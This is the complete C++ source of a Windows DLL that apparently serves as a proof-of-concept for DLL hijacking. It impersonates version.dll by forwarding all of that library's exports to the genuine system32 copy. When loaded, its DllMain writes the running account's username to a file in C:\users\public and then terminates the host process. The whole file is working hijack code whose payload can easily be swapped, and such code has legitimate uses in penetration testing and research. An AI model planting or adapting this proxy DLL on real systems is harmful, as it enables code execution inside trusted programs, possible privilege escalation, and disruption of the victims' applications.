// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include <lmcons.h>

#pragma comment(linker,"/export:GetFileVersionInfoA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoA,@1")
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoByHandle,@2")
#pragma comment(linker,"/export:GetFileVersionInfoExA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoExA,@3")
#pragma comment(linker,"/export:GetFileVersionInfoExW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoExW,@4")
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoSizeA,@5")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoSizeW,@8")
#pragma comment(linker,"/export:GetFileVersionInfoW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.GetFileVersionInfoW,@9")
#pragma comment(linker,"/export:VerFindFileA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerFindFileA,@10")
#pragma comment(linker,"/export:VerFindFileW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerFindFileW,@11")
#pragma comment(linker,"/export:VerInstallFileA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerInstallFileA,@12")
#pragma comment(linker,"/export:VerInstallFileW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerInstallFileW,@13")
#pragma comment(linker,"/export:VerLanguageNameA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerLanguageNameA,@14")
#pragma comment(linker,"/export:VerLanguageNameW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerLanguageNameW,@15")
#pragma comment(linker,"/export:VerQueryValueA=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerQueryValueA,@16")
#pragma comment(linker,"/export:VerQueryValueW=\\\\?\\globalroot\\systemroot\\system32\\VERSION.VerQueryValueW,@17")


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    HANDLE hOutFile = NULL;
    WCHAR wszUsername[UNLEN + 1] = { 0 };
    DWORD dwUnameLength = UNLEN + 1;
    DWORD dwBytesWritten = 0;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        hOutFile = CreateFileW(L"C:\\users\\public\\temp.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hOutFile != NULL && hOutFile != INVALID_HANDLE_VALUE) {

            if (GetUserNameW(wszUsername, &dwUnameLength)) {

                WriteFile(hOutFile, L"Running as: ", 12 * sizeof(WCHAR), &dwBytesWritten, NULL);
                WriteFile(hOutFile, wszUsername, dwUnameLength * sizeof(WCHAR), &dwBytesWritten, NULL);

            }

            CloseHandle(hOutFile);

        }

        ExitProcess(0);

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

